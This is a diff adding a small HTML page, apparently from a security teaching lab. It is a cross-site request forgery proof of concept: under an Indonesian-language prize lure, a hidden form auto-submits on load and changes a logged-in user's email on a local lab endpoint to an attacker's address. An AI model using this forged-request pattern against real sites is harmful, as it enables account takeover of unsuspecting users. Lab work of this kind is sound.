@@ -1,0 +1,13 @@
+<!-- evil-site.html -->
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Selamat! Anda menang hadiah, klik untuk klaim</h1>
+    <form id="csrf-form" action="http://127.0.0.1:8000/lab/csrf/update-email" method="POST">
+        <input type="hidden" name="email" value="hacked@attacker.com">
+    </form>
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
